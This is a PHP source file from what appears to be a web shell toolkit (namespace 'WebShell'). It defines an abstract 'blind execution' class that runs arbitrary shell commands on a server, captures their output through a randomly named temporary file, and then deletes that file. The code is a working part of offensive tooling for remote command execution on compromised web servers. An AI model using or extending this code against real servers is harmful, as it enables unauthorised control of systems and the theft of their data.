<?php
namespace WebShell;

abstract class BlindExecutionMethod implements ExecutionMethod
{
    public function execute($cmd)
    {
        // Create a temporary random file and redirect the command output to it
        $fileName = bin2hex(random_bytes(32)) . '.txt';
        $this->run_command($cmd . " > {$fileName} 2>&1");

        // Read the contents of the file
        $fd = fopen($fileName, 'r');
        $output = fread($fd, filesize($fileName));

        // Delete the temporary file
        unlink($fileName);
        
        // Return the command output
        return $output;
    }

    abstract protected function run_command($cmd);
}
?>
